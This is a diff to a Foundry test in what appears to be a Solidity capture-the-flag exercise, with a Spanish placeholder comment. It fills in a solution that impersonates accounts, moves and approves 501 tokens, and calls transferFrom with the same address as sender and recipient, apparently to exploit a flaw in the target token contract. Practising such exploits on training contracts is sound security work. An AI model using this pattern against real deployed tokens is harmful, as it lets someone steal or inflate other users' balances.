@@ -18,7 +18,18 @@ contract Challenge2Test is Test {
         vm.startPrank(address(player));
 
         // tu codigo aca
+
+        address player2 = vm.addr(2);
+        target.transfer(player2, 501);
+
+        vm.stopPrank();
+        vm.prank(player2);
+        target.approve(player, 501);
         
+        vm.startPrank(address(player));
+        target.transferFrom(player2, player2, 501);
+        
+                
         assertTrue(target.isComplete());
     }
 }
